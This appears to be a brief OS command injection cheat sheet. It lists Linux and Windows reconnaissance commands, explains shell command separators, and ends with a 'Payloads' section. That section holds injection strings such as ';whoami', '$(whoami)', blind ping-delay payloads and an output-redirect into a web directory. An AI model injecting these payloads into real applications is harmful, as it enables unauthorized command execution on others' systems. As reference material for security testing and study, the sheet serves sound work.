Some useful linux commands
- whoami
- ls
- cat
- echo
- uname -a
- ifconfig
- netstat -an
- ps -ef
- cat

 
Some useful windows commands
- whoami
- dir
- type
- echo
- ver
- ipconfig /all
- netstat -an
- tasklist

linux-windows commands seperates<br>
```
command1 ; command2 = Executes the second command after the first, regardless of success(Only Linux)
command1 & command2 = Runs both commands in parallel in the background.
command1 | command2 = Pipes the output of the first command to the second command.
command1 && command2 = Runs the second command only if the first command is successful.
command1 || command2 = Runs the second command only if the first command fails.

```


# Payloads
```
;whoami
$(whoami)
$(ping -c 10 127.0.0.1)
||ping+-c+10+127.0.0.1||
whoami+>+/var/www/images/example.txt
```
